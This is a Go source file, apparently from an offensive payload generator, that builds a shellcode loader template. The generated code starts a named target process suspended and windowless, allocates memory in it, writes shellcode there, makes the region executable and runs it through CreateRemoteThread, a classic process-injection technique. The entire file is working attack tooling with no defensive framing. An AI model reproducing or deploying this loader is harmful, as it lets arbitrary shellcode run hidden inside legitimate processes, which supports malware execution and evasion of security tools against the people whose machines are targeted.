package loaders

import (
	"fmt"
	"strings"
)

type CRTTemplate struct{}

func (t CRTTemplate) Import() string {
	return fmt.Sprintf(`
import (
    "syscall"
    "unsafe"
)
`)
}

func (t CRTTemplate) Const() string {
	return fmt.Sprintf(`
const (
    MEM_COMMIT                = 0x1000
    MEM_RESERVE               = 0x2000
    PAGE_READWRITE            = 0x4
    PAGE_EXECUTE_READ         = 0x20
    PAGE_EXECUTE_READWRITE    = 0x40
    CREATE_SUSPENDED          = 0x4
    CREATE_NO_WINDOW          = 0x8000000
)

var (
    kernel32            = syscall.MustLoadDLL("kernel32.dll")

    VirtualAllocEx      = kernel32.MustFindProc("VirtualAllocEx")
    VirtualProtectEx    = kernel32.MustFindProc("VirtualProtectEx")
    WriteProcessMemory  = kernel32.MustFindProc("WriteProcessMemory")
    CreateRemoteThread  = kernel32.MustFindProc("CreateRemoteThread")
)
`)
}

func (t CRTTemplate) Init() string {
	return fmt.Sprintf(`
func loadProcess(target string) *syscall.ProcessInformation {
    var si syscall.StartupInfo
	var pi syscall.ProcessInformation

	commandLine, err := syscall.UTF16PtrFromString(target)
	if err != nil {
		panic(err)
	}

    err = syscall.CreateProcess(
		nil,
		commandLine,
		nil,
		nil,
		false,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,
		nil,
		nil,
		&si,
		&pi,
    ); if err != nil {
		panic(err)
	}

	return &pi
}
`)
}

func (t CRTTemplate) Process() string {
	return fmt.Sprintf(`
    /* spawn target process */
    process := loadProcess("__PROCESS__")
    oldProtectCfg := PAGE_READWRITE

     /* allocating the appropriate amount of memory */
    baseAddr, _, _ := VirtualAllocEx.Call(
        uintptr(process.Process),
        0,
        uintptr(len(shellcode)),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    )

    /* overwriting process memory with our shellcode */
    _, _, _ = WriteProcessMemory.Call(
        uintptr(process.Process),
        baseAddr,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
        0,
    )

    /* changing permissions for our memory segment */
    _, _, _ = VirtualProtectEx.Call(
        uintptr(process.Process),
        baseAddr,
        uintptr(len(shellcode)),
        PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&oldProtectCfg)),
    )

    /* load remote thread */
    _, _, _ = CreateRemoteThread.Call(uintptr(process.Process), 0, 0, baseAddr, 0, 0, 0)
`)
}

func (t CRTTemplate) GetTemplate(targetProcess string) string {
	var template = `
package main

__IMPORT__STATEMENT__

__CONST__STATEMENT__

__IMPORT__INIT__	

func ExecuteOrderSixtySix(shellcode []byte) {

__IMPORT__PROCESS__

}
`
	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.Import(), -1)
	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
	template = strings.Replace(template, "__IMPORT__INIT__", t.Init(), -1)
	template = strings.Replace(template, "__IMPORT__PROCESS__", t.Process(), -1)

	return strings.Replace(template, "__PROCESS__", targetProcess, -1)
}
